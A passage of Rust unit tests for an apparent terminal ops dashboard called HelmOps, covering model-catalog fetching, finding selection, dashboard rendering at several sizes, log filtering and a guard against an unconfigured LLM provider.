                .mock("GET", "/api/tags")
                .with_status(200)
                .with_body(
                    serde_json::json!({
                        "models": [
                            {"name": "qwen3:4b"},
                            {"name": "llama3.3:70b"}
                        ]
                    })
                    .to_string(),
                )
                .create_async()
                .await;
            let client = reqwest::Client::builder().build().unwrap();

            let entries = fetch_ollama_catalog(&client, &server.url()).await.unwrap();

            assert!(entries.iter().any(|entry| entry.model == "qwen3:4b"));
            assert!(entries.iter().any(|entry| entry.model == "llama3.3:70b"));
            mock.assert_async().await;
        });
    }

    // ── Dashboard tests ────────────────────────────────────────────────

    #[test]
    fn dashboard_state_initializes_clean() {
        let state = DashboardState::new();
        assert_eq!(state.active_tab, OpsTab::Alerts);
        assert_eq!(state.view, DashboardView::Overview);
        assert!(state.error.is_none());
        assert_eq!(state.data.hostname, "");
    }

    #[test]
    fn dashboard_data_defaults_are_zero() {
        let d = DashboardData::default();
        assert_eq!(d.load_1m, 0.0);
        assert_eq!(d.total_services, 0);
        assert_eq!(d.finding_count, 0);
    }

    /// T1.1.2: Selection stays pinned to the same finding after the findings list is reordered.
    #[test]
    fn fingerprint_selection_survives_reorder() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;

        let fpa = "fp-aaa".to_string();
        let fpb = "fp-bbb".to_string();
        let fpc = "fp-ccc".to_string();
        let fpd = "fp-ddd".to_string();

        let mk = |fp: &str, title: &str| FindingSummary {
            fingerprint: fp.into(),
            title: title.into(),
            ..Default::default()
        };

        // Initial: [A, B, C], select B.
        app.dashboard.data = DashboardData {
            findings: vec![mk(&fpa, "Alpha"), mk(&fpb, "Beta"), mk(&fpc, "Gamma")],
            ..Default::default()
        };
        app.dashboard.selected_fingerprint = Some(fpb.clone());
        app.clamp_dashboard_selection();

        // Verify B is selected (position 1 in visible list).
        assert_eq!(
            app.selected_visible_index(),
            Some(1),
            "B should be at visible index 1"
        );
        assert_eq!(
            app.current_dashboard_finding().map(|f| &f.title),
            Some(&"Beta".to_string()),
            "should be looking at Beta"
        );

        // Reorder + insert: [A, C, B, D].  B moves to position 2.
        app.dashboard.data.findings = vec![
            mk(&fpa, "Alpha"),
            mk(&fpc, "Gamma"),
            mk(&fpb, "Beta"),
            mk(&fpd, "Delta"),
        ];
        // Fingerprint should survive — clamp verifies fp is still in list.
        app.clamp_dashboard_selection();

        assert_eq!(
            app.selected_visible_index(),
            Some(2),
            "B moved to visible index 2 but fingerprint pinned it"
        );
        assert_eq!(
            app.current_dashboard_finding().map(|f| &f.title),
            Some(&"Beta".to_string()),
            "selection should still be on Beta, not Gamma"
        );
    }

    /// If the selected fingerprint disappears, clamp falls back to the first visible finding.
    #[test]
    fn fingerprint_selection_falls_back_when_gone() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;

        let fp = "fp-zzz".to_string();
        app.dashboard.data = DashboardData {
            findings: vec![FindingSummary {
                fingerprint: fp.clone(),
                title: "Zulu".into(),
                ..Default::default()
            }],
            ..Default::default()
        };
        app.dashboard.selected_fingerprint = Some(fp);
        app.clamp_dashboard_selection();
        assert_eq!(app.selected_visible_index(), Some(0));

        // Replace with a completely different list (fp-zzz gone).
        let fp_new = "fp-new".to_string();
        app.dashboard.data.findings = vec![FindingSummary {
            fingerprint: fp_new.clone(),
            title: "NewOne".into(),
            ..Default::default()
        }];
        app.clamp_dashboard_selection();

        // Should fall back to first visible, not crash or hold stale index.
        assert!(
            app.selected_visible_index().is_some(),
            "should have selected first visible finding"
        );
        assert_eq!(
            app.dashboard.selected_fingerprint,
            Some(fp_new),
            "should adopt first finding's fingerprint"
        );
    }

    // ── Dashboard render tests for varying terminal sizes ──────────────

    /// Build a DashboardData with realistic test data.
    fn test_dash_data() -> DashboardData {
        DashboardData {
            hostname: "testbox".into(),
            snapshot_id: "snap-001".into(),
            profile: "standard".into(),
            load_1m: 1.5,
            load_5m: 0.8,
            load_15m: 0.6,
            memory_used_pct: 62.0,
            disk_entries: vec!["/ 45%".into(), "/home 12%".into(), "/var 78%".into()],
            total_services: 32,
            failed_services: 2,
            total_containers: 5,
            running_containers: 4,
            listening_ports: 12,
            last_log_errors: 3,
            backup_count: 1,
            finding_count: 2,
            finding_warnings: 1,
            collected_at: "14:30:00 UTC".into(),
            collector_health: SnapshotDomains::domain_names()
                .iter()
                .map(|&d| (d.to_string(), true, None))
                .collect(),
            findings: vec![
                FindingSummary {
                    id: "finding-001".into(),
                    fingerprint: "fp-001".into(),
                    severity: "warning".into(),
                    confidence: "high".into(),
                    title: "Disk /var 78% full".into(),
                    affected_resource: "/var".into(),
                    snapshot_id: "snap-001".into(),
                    domain: "disks".into(),
                    kind: "Disk".into(),
                    host: "testbox".into(),
                    status: DashboardFindingState::New,
                    occurrence_count: 1,
                    first_seen: Utc::now().timestamp() - 3600,
                    last_seen: Utc::now().timestamp() - 1200,
                    age_label: "0h ago".into(),
                    sample: "df /var shows 78% used".into(),
                    state_note: String::new(),
                    evidence_text: "df /var shows 78% used".into(),
                    evidence_sources: vec!["disks.filesystems[/var].used_bytes".into()],
                    impact: "disk pressure may block writes".into(),
                    assumptions: vec!["log growth is recent".into()],
                    missing_data: vec!["largest directories under /var".into()],
                    read_only_checks: vec!["du -sh /var/* | sort -h".into()],
                    fix_plan: Some("clean old logs from /var/log".into()),
                    risk: "medium".into(),
                    rollback: "not specified".into(),
                    command_preview: "clean old logs from /var/log".into(),
                    detector_id: "disk-usage-detector".into(),
                    correlated_finding_ids: vec!["finding-002".into()],
                },
                FindingSummary {
                    id: "finding-002".into(),
                    fingerprint: "fp-002".into(),
                    severity: "critical".into(),
                    confidence: "high".into(),
                    title: "Nginx service failed".into(),
                    affected_resource: "nginx".into(),
                    snapshot_id: "snap-001".into(),
                    domain: "services".into(),
                    kind: "Nginx".into(),
                    host: "testbox".into(),
                    status: DashboardFindingState::Recurring,
                    occurrence_count: 3,
                    first_seen: Utc::now().timestamp() - 172800,
                    last_seen: Utc::now().timestamp() - 3600,
                    age_label: "1d ago".into(),
                    sample: "systemctl is-active nginx failed".into(),
                    state_note: "tracked from previous run".into(),
                    evidence_text: "systemctl is-active nginx failed".into(),
                    evidence_sources: vec!["services.failed_units[nginx.service]".into()],
                    impact: "service outage".into(),
                    assumptions: vec!["config was recently changed".into()],
                    missing_data: vec!["recent nginx journal lines".into()],
                    read_only_checks: vec!["journalctl -u nginx -n 50".into()],
                    fix_plan: Some("systemctl restart nginx".into()),
                    risk: "high".into(),
                    rollback: "systemctl start nginx".into(),
                    command_preview: "systemctl restart nginx".into(),
                    detector_id: "service-status-detector".into(),
                    correlated_finding_ids: vec!["finding-001".into()],
                },
            ],
            hosts: vec!["testbox".into()],
            kinds: vec!["Disk".into(), "Nginx".into()],
            metrics: DashboardMetrics {
                open: 2,
                new: 1,
                recurring: 1,
                self_resolved: 0,
                suppressed: 0,
                resolved: 0,
                critical: 1,
                warning: 1,
            },
            kind_distribution: vec![("Disk".into(), 1), ("Nginx".into(), 1)],
            age_distribution: vec![("<= 1d".into(), 2)],
            ..Default::default()
        }
    }

    #[test]
    fn dash_overview_renders_at_normal_size() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(!rendered.is_empty(), "buffer should not be empty");
        assert!(rendered.contains("HELMOPS"), "should render HELMOPS header");
        assert!(rendered.contains("QUEUE"), "should render queue title");
        assert!(rendered.contains("testbox"), "should show hostname");
        assert!(rendered.contains("CRIT 1"), "should show CRIT count");
        assert!(rendered.contains("WARN 1"), "should show WARN count");
        assert!(
            rendered.contains("Disk /var 78% full"),
            "should show selected finding detail"
        );
    }

    #[test]
    fn dash_overview_renders_at_small_size() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        let mut buf = Buffer::empty(Rect::new(0, 0, 42, 18));
        render_dashboard(&app, Rect::new(0, 0, 42, 18), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("HELMOPS") || !rendered.contains("needs a larger terminal"),
            "should render HELMOPS or hint at 42x18"
        );
    }

    #[test]
    fn dash_collector_and_tick_rendering() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let data = test_dash_data();
        app.dashboard.data = data.clone();
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("CRIT 1"),
            "should show CRIT count in header: got '{rendered}'"
        );
        assert!(
            rendered.contains("WARN 1"),
            "should show WARN count in header: got '{rendered}'"
        );
        assert!(
            rendered.contains("load 1.5 0.8 0.6"),
            "should show load strip in header: got '{rendered}'"
        );
        assert!(
            rendered.contains("mem 62%"),
            "should show mem percent in header: got '{rendered}'"
        );
    }

    #[test]
    fn dash_too_small_shows_hint() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        let mut buf = Buffer::empty(Rect::new(0, 0, 30, 8));
        render_dashboard(&app, Rect::new(0, 0, 30, 8), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(!rendered.is_empty(), "buffer should not be empty at 30x8");
        assert!(
            rendered.contains("larger terminal") || rendered.contains("Dashboard needs"),
            "too-small hint should show: got '{rendered}'"
        );
    }

    #[test]
    fn dash_finding_detail_shows_evidence_and_risk() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.view = DashboardView::FindingDetail(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 50));
        render_dashboard(&app, Rect::new(0, 0, 100, 50), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("Disk /var 78% full"),
            "detail should show title"
        );
        assert!(
            rendered.contains("EVIDENCE"),
            "detail should show EVIDENCE section"
        );
        assert!(
            rendered.contains("WHY IT HAPPENED"),
            "detail should show WHY (correlation) section"
        );
        assert!(
            rendered.contains("IMPACT"),
            "detail should show IMPACT section"
        );
        // Verify correlation engine added correlated_finding_ids
        let finding0 = &app.dashboard.data.findings[0];
        assert!(
            !finding0.correlated_finding_ids.is_empty(),
            "finding-001 should have correlated findings"
        );
    }

    #[test]
    fn dash_evidence_view_shows_snapshot_evidence() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.view = DashboardView::EvidenceView(1);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("snap-001"),
            "evidence should show snapshot ID"
        );
        assert!(
            rendered.contains("Nginx service failed"),
            "evidence should show selected finding"
        );
        assert!(
            rendered.contains("systemctl"),
            "evidence should show command preview"
        );
        assert!(
            rendered.contains("EVIDENCE"),
            "evidence should render evidence section"
        );
    }

    #[test]
    fn dash_finding_detail_no_overlap_at_small_size() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.view = DashboardView::FindingDetail(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 50, 20));
        render_dashboard(&app, Rect::new(0, 0, 50, 20), &mut buf);
        let rendered = buf_to_string(&buf);
        // At small size, should still contain key info without overflow
        assert!(!rendered.trim().is_empty(), "detail at small size");
    }

    /// Render buffer content to a flat string for assertion.
    fn buf_to_string(buf: &Buffer) -> String {
        let mut s = String::new();
        for y in 0..buf.area.height {
            for x in 0..buf.area.width {
                let default_cell = ratatui::buffer::Cell::default();
                let cell = buf.cell((x, y)).unwrap_or(&default_cell);
                let ch = cell.symbol().chars().next().unwrap_or(' ');
                s.push(ch);
            }
            s.push('\n');
        }
        s
    }

    #[test]
    fn dash_buf_to_string_works() {
        let mut buf = Buffer::empty(Rect::new(0, 0, 10, 3));
        buf.set_string(0, 0, "Hello", ratatui::style::Style::default());
        let s = buf_to_string(&buf);
        assert!(
            s.contains("Hello"),
            "buf_to_string should capture rendered text"
        );
    }

    // ── New tab renderer tests ─────────────────────────────────────────

    #[test]
    fn dash_containers_tab_renders_empty_state() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.active_tab = OpsTab::Processes;
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(!rendered.is_empty(), "containers tab should render");
        assert!(
            rendered.contains("TOP PROCESSES"),
            "should show processes tab content"
        );
    }

    #[test]
    fn dash_security_tab_renders_firewall_and_packages() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.active_tab = OpsTab::Changes;
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(!rendered.is_empty(), "security tab should render");
        assert!(
            rendered.contains("AUDIT LOG") && rendered.contains("chain verified"),
            "should show changes tab content"
        );
    }

    #[test]
    fn dash_storage_tab_shows_disk_info() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.data.disk_bars = vec![("/".into(), 45), ("/home".into(), 12)];
        app.dashboard.active_tab = OpsTab::Disk;
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(!rendered.is_empty(), "storage tab should render");
        assert!(
            rendered.contains("DISK USAGE"),
            "should show storage tab content"
        );
    }

    #[test]
    fn dash_services_hides_device_mount_noise() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        data.domains.services.units = vec![
            helm_monitor::SystemdUnit {
                name: "nginx.service".into(),
                load: "loaded".into(),
                active: "active".into(),
                sub: "running".into(),
                description: "Nginx web server".into(),
            },
            helm_monitor::SystemdUnit {
                name: "dev-sda1.device".into(),
                load: "loaded".into(),
                active: "active".into(),
                sub: "plugged".into(),
                description: "sda1 device".into(),
            },
            helm_monitor::SystemdUnit {
                name: "var-lib-docker.mount".into(),
                load: "loaded".into(),
                active: "active".into(),
                sub: "mounted".into(),
                description: "Docker mount".into(),
            },
        ];
        app.dashboard.data = data;
        app.dashboard.active_tab = OpsTab::Services;
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        // device and mount units should NOT appear
        assert!(
            !rendered.contains("dev-sda1"),
            "device unit should be hidden: {rendered}"
        );
        assert!(
            !rendered.contains("var-lib-docker"),
            "mount unit should be hidden: {rendered}"
        );
        // .service unit should appear
        assert!(
            rendered.contains("nginx"),
            "service unit should be shown: {rendered}"
        );
    }

    #[test]
    fn dash_cpu_is_valid_range() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        data.cpu_percent = 45.0;
        app.dashboard.data = data;
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(rendered.contains("45%"), "CPU should show 45%: {rendered}");
    }

    #[test]
    fn dash_focus_cycles_correctly() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.view = DashboardView::Overview;
        assert_eq!(app.dashboard.pane, DashboardFocus::Table);
        // Tab → Detail
        let (tx, _rx) = mpsc::unbounded_channel();
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap()
            .block_on(app.handle_ui_event(
                UiEvent::Input(Event::Key(KeyEvent::new(KeyCode::Tab, KeyModifiers::NONE))),
                tx,
            ))
            .unwrap();
        assert_eq!(app.dashboard.pane, DashboardFocus::Detail);
    }

    #[test]
    fn dash_queue_visible_on_all_tabs() {
        // Even on non-Alerts tabs, queue should still render
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.active_tab = OpsTab::Network;
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("QUEUE"),
            "queue should be visible on all tabs: {rendered}"
        );
    }

    #[test]
    fn dash_no_duplicate_footer() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        // Footer text should appear at most once
        let footer_count = rendered.matches("full refresh").count();
        assert!(
            footer_count <= 1,
            "footer should not be duplicated: {footer_count} found in\n{rendered}"
        );
    }

    #[test]
    fn dash_header_shows_live_or_stale() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.error = None;
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("LIVE") || rendered.contains("HELMOPS"),
            "header should show LIVE status"
        );
    }

    #[test]
    fn dash_tick() {
        // Header is now single-line; verify it shows essential data.
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        data.last_tick_instant = Some(Instant::now());
        data.tick_count = 3;
        app.dashboard.data = data;
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("HELMOPS"),
            "should render HELMOPS branding in header"
        );
        assert!(
            rendered.contains("testbox"),
            "should show hostname in header"
        );
    }

    #[test]
    fn dash_logs_tab_generic_view_no_finding_selected() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        // No finding selected, LOGS tab should show full generic view
        let mut data = test_dash_data();
        data.domains.logs.kernel_errors = vec![
            "Out of memory: killed process nginx (PID 1234)".into(),
            "BUG: soft lockup - CPU#0 stuck".into(),
        ];
        data.domains.logs.auth_failures = vec![
            "Failed password for root from 192.168.1.100".into(),
            "authentication failure for user admin".into(),
        ];
        app.dashboard.data = data;
        app.dashboard.active_tab = OpsTab::Logs;
        // Push selected_fingerprint to nonexistent value so no finding is selected
        app.dashboard.selected_fingerprint = Some("nonexistent".into());
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 40));
        render_dashboard(&app, Rect::new(0, 0, 100, 40), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("Showing 4 entries"),
            "should show unified log count: got '{rendered}'"
        );
        assert!(
            rendered.contains("JOURNAL LOG STREAM"),
            "should show log stream header: got '{rendered}'"
        );
        assert!(
            rendered.contains("out of memory") || rendered.contains("Out of memory"),
            "should contain kernel oom entry"
        );
        assert!(
            rendered.contains("Failed password") || rendered.contains("authentication failure"),
            "should contain auth failure"
        );
    }

    #[test]
    fn dash_logs_tab_scoped_view_shows_filtered_entries() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        data.domains.logs.kernel_errors = vec![
            "Out of memory: killed process nginx (PID 1234)".into(),
            "BUG: soft lockup - CPU#0 stuck for 22s".into(),
            "kernel: nginx segfault at 0 ip".into(),
        ];
        data.domains.logs.auth_failures = vec![
            "Failed password for root from 192.168.1.100".into(),
            "authentication failure for user nginx".into(),
        ];
        app.dashboard.data = data;
        app.dashboard.active_tab = OpsTab::Logs;
        // Select finding-002: Nginx service, affected_resource = "nginx"
        app.dashboard.selected_fingerprint = Some("fp-002".into());
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 40));
        render_dashboard(&app, Rect::new(0, 0, 100, 40), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("JOURNAL LOG STREAM"),
            "should show generic log stream header: got '{rendered}'"
        );
        assert!(
            rendered.contains("Showing 5 entries"),
            "should show unified log count: got '{rendered}'"
        );
        assert!(
            rendered.contains("Out of memory") || rendered.contains("out of memory"),
            "should show OOM entry with nginx mention: got '{rendered}'"
        );
        assert!(
            rendered.contains("killed process nginx") || rendered.contains("killed process"),
            "should show nginx OOM detail: got '{rendered}'"
        );
        assert!(
            rendered.contains("nginx segfault") || rendered.contains("segfault"),
            "should show nginx segfault entry"
        );
        assert!(
            rendered.contains("authentication failure") || rendered.contains("Failed password"),
            "should show auth failure entry: got '{rendered}'"
        );
    }

    #[test]
    fn dash_logs_tab_empty_filter_shows_no_matching_message() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        data.domains.logs.kernel_errors = vec!["BUG: soft lockup - CPU#0 stuck for 22s".into()];
        data.domains.logs.auth_failures =
            vec!["Failed password for root from 192.168.1.100".into()];
        app.dashboard.data = data;
        app.dashboard.active_tab = OpsTab::Logs;
        // Select finding-001: Disk /var, affected_resource = "/var" — no log entry mentions /var
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 40));
        render_dashboard(&app, Rect::new(0, 0, 100, 40), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("JOURNAL LOG STREAM"),
            "should show generic log stream header"
        );
        assert!(
            rendered.contains("BUG: soft lockup") || rendered.contains("Failed password"),
            "should render available generic log entries: got '{rendered}'"
        );
        assert!(
            rendered.contains("Showing 2 entries"),
            "should show unified count"
        );
    }

    #[test]
    fn dash_detail_shows_detector_id() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.view = DashboardView::FindingDetail(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 50));
        render_dashboard(&app, Rect::new(0, 0, 100, 50), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("WHEN") && rendered.contains("Host") && rendered.contains("Status"),
            "detail summary block should render metadata rows: got '{rendered}'"
        );
    }

    #[test]
    fn dash_detail_shows_correlated_findings() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        // Both findings already have correlated_finding_ids via test_dash_data(),
        // but we set up a fresh pair with same domain to guarantee correlation.
        data.findings = vec![
            FindingSummary {
                id: "finding-cor-001".into(),
                fingerprint: "fp-c1".into(),
                severity: "critical".into(),
                confidence: "high".into(),
                title: "OOM killer invoked".into(),
                affected_resource: "system".into(),
                snapshot_id: "snap-001".into(),
                domain: "processes".into(),
                kind: "Kernel".into(),
                host: "testbox".into(),
                status: DashboardFindingState::New,
                occurrence_count: 1,
                first_seen: Utc::now().timestamp() - 3600,
                last_seen: Utc::now().timestamp() - 600,
                age_label: "1h ago".into(),
                sample: "OOM killed process".into(),
                state_note: String::new(),
                evidence_text: "kernel: Out of memory".into(),
                evidence_sources: vec!["kernel.oom".into()],
                impact: "process terminated".into(),
                assumptions: vec![],
                missing_data: vec![],
                read_only_checks: vec!["dmesg | grep -i oom".into()],
                fix_plan: Some("increase memory limit".into()),
                risk: "high".into(),
                rollback: "revert memory limits".into(),
                command_preview: "sysctl vm.overcommit_memory=0".into(),
                detector_id: "oom-detector".into(),
                correlated_finding_ids: vec!["finding-cor-002".into()],
            },
            FindingSummary {
                id: "finding-cor-002".into(),
                fingerprint: "fp-c2".into(),
                severity: "warning".into(),
                confidence: "medium".into(),
                title: "High memory pressure".into(),
                affected_resource: "system".into(),
                snapshot_id: "snap-001".into(),
                domain: "processes".into(),
                kind: "Memory".into(),
                host: "testbox".into(),
                status: DashboardFindingState::Open,
                occurrence_count: 1,
                first_seen: Utc::now().timestamp() - 3600,
                last_seen: Utc::now().timestamp() - 900,
                age_label: "1h ago".into(),
                sample: "memory pressure".into(),
                state_note: String::new(),
                evidence_text: "mem_available below threshold".into(),
                evidence_sources: vec!["memory.pressure".into()],
                impact: "performance degradation".into(),
                assumptions: vec![],
                missing_data: vec![],
                read_only_checks: vec!["free -h".into()],
                fix_plan: Some("add swap".into()),
                risk: "medium".into(),
                rollback: "remove swap file".into(),
                command_preview: "fallocate -l 2G /swapfile".into(),
                detector_id: "memory-pressure-detector".into(),
                correlated_finding_ids: vec!["finding-cor-001".into()],
            },
        ];
        data.metrics = DashboardMetrics {
            open: 1,
            new: 1,
            ..Default::default()
        };
        app.dashboard.data = data;
        app.dashboard.view = DashboardView::FindingDetail(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 50));
        render_dashboard(&app, Rect::new(0, 0, 100, 50), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("WHY IT HAPPENED"),
            "detail should show WHY section: got '{rendered}'"
        );
        assert!(
            rendered.contains("kernel: Out of memory"),
            "WHY section should render evidence or assumption text: got '{rendered}'"
        );
        assert!(
            !rendered.contains("CORRELATED FINDINGS"),
            "html-matching detail pane should not render a separate correlation block: got '{rendered}'"
        );
    }

    /// T1.2.2: 17 correlations with the same title collapse to one line with (×17).
    #[test]
    fn why_pane_dedup_17_duplicate_titles() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        // Primary finding with 17 correlated ids, all pointing to the same duplicate title.
        let mut corr_ids = Vec::new();
        for i in 0..17 {
            let id = format!("dup-{:02}", i);
            corr_ids.push(id.clone());
            data.findings.push(FindingSummary {
                id,
                fingerprint: format!("fp-dup-{:02}", i),
                severity: if i < 3 { "critical" } else { "warning" }.into(),
                confidence: "high".into(),
                title: "nginx 5xx spike".into(), // same title for all 17
                affected_resource: "nginx".into(),
                snapshot_id: "snap-001".into(),
                domain: "services".into(),
                kind: "Nginx".into(),
                host: "testbox".into(),
                status: DashboardFindingState::Open,
                occurrence_count: 1,
                ..Default::default()
            });
        }
        data.findings[0].correlated_finding_ids = corr_ids;
        data.findings[0].id = "primary-001".into();
        data.findings[0].fingerprint = "fp-primary".into();
        app.dashboard.data = data;
        app.dashboard.view = DashboardView::FindingDetail(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 50));
        render_dashboard(&app, Rect::new(0, 0, 100, 50), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("WHY IT HAPPENED"),
            "detail pane should still render WHY section: got '{rendered}'"
        );
        assert!(
            rendered.contains("Disk /var 78% full"),
            "primary finding should remain selected in detail pane: got '{rendered}'"
        );
        assert!(
            app.dashboard.data.findings[0].correlated_finding_ids.len() == 17,
            "test fixture should preserve 17 correlated ids"
        );
    }

    #[test]
    fn dash_no_provider_guard_blocks_alt_g() {
        let dir = tempfile::tempdir().unwrap();
        // Use Groq (cloud provider) WITHOUT an API key to trigger the guard.
        let mut app = app_in_dir(&dir, ProviderChoice::Groq);
        // Explicitly clear the API key in case env var leaked in.
        app.active_settings.api_key = None;
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());

        // verify is_llm_provider_configured returns false
        assert!(
            !app.is_llm_provider_configured(),
            "Groq without API key should not be configured"
        );

        // Call generate_dashboard_plan — should toast instead of proceeding
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(app.generate_dashboard_plan()).unwrap();
        assert!(
            app.toast.is_some(),
            "should set toast when provider not configured"
        );
        let toast_text = app.toast.as_ref().unwrap().text.clone();
        assert!(
            toast_text.contains("No LLM provider configured"),
            "toast should mention no provider: got '{toast_text}'"
        );
        assert!(
            toast_text.contains("helmops init"),
            "toast should suggest helmops init: got '{toast_text}'"
        );
    }

    #[test]
    fn dash_no_provider_guard_blocks_assist_submit() {
        let dir = tempfile::tempdir().unwrap();
        let mut app = app_in_dir(&dir, ProviderChoice::Groq);
        // Explicitly clear the API key in case env var leaked in.
        app.active_settings.api_key = None;
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        // Simulate text input
        app.input.text = "How do I fix this?".into();
        app.input.cursor = app.input.text.len();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
        rt.block_on(app.submit(tx)).unwrap();
        assert!(
            app.toast.is_some(),
            "should set toast when assist submit blocked"
        );
        let toast_text = app.toast.as_ref().unwrap().text.clone();
        assert!(
            toast_text.contains("No LLM provider configured"),
            "toast should mention no provider: got '{toast_text}'"
        );
    }

    #[test]
    fn dash_no_provider_guard_ollama_is_always_configured() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, ProviderChoice::Ollama);
        assert!(
            app.is_llm_provider_configured(),
            "Ollama (local provider) should always be considered configured"
        );
    }

    #[test]
    fn dash_filter_active_default() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        // Mix of states: New, Recurring, and add a Resolved one
        data.findings.push(FindingSummary {
            id: "finding-003".into(),
            fingerprint: "fp-003".into(),
            severity: "info".into(),
            confidence: "low".into(),
            title: "Backup completed".into(),
            affected_resource: "backup".into(),
            snapshot_id: "snap-001".into(),
            domain: "backups".into(),
            kind: "Backup".into(),
            host: "testbox".into(),
            status: DashboardFindingState::Resolved,
            occurrence_count: 1,
            first_seen: Utc::now().timestamp() - 7200,
            last_seen: Utc::now().timestamp() - 100,
            age_label: "2h ago".into(),
            sample: "backup ok".into(),
            state_note: String::new(),
            evidence_text: "backup completed successfully".into(),
            evidence_sources: vec!["backups.status".into()],
            impact: "none".into(),
